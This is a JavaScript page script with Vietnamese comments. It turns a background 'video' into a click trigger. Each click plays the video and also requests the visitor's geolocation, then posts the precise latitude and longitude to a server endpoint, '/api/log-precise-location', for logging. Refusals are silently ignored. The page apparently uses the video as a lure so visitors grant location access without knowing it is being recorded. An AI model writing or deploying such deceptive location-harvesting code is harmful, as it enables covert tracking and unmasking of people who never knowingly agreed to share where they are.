// Lấy các element cần thiết từ HTML
const triggerElement = document.getElementById("location-trigger");
const videoElement = document.querySelector(".background-video");
const playIcon = document.querySelector(".fa-play");

// Lắng nghe sự kiện click vào khu vực "video"
triggerElement.addEventListener("click", () => {
  // Nếu video đang dừng thì cho phát và ẩn nút play đi
  if (videoElement.paused) {
    videoElement.play();
    playIcon.style.display = "none"; // Ẩn nút play
  }

  // Logic hỏi quyền vị trí vẫn giữ nguyên
  console.log("Khu vực video được click, chuẩn bị hỏi quyền vị trí...");
  requestLocationPermission();
});

// --- CÁC HÀM BÊN DƯỚI GIỮ NGUYÊN KHÔNG THAY ĐỔI ---

function requestLocationPermission() {
  // Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
  if ("geolocation" in navigator) {
    // Nếu có, gọi hàm để lấy vị trí
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
  } else {
    alert("Rất tiếc, trình duyệt của bạn không hỗ trợ lấy vị trí.");
  }
}

// Hàm được gọi khi người dùng ĐỒNG Ý cấp quyền
function successCallback(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  console.log(`Lấy vị trí thành công: Lat ${lat}, Lon ${lon}`);

  // Gửi tọa độ lên server để ghi log
  fetch("/api/log-precise-location", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ latitude: lat, longitude: lon }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Server responded with an error");
      }
      return response.json();
    })
    .then((data) => {
      console.log("Phản hồi từ server:", data);
    })
    .catch((error) => {
      console.error("Lỗi khi gửi vị trí lên server:", error);
    });
}

// Hàm được gọi khi người dùng TỪ CHỐI cấp quyền hoặc có lỗi
function errorCallback(error) {
  console.log(`Có lỗi xảy ra: ${error.message}`);
  switch (error.code) {
    case error.PERMISSION_DENIED:
      break;
    case error.POSITION_UNAVAILABLE:
      alert("Không thể xác định được vị trí của bạn.");
      break;
    case error.TIMEOUT:
      alert("Yêu cầu lấy vị trí đã hết hạn.");
      break;
    default:
      alert("Một lỗi không xác định đã xảy ra.");
      break;
  }
}
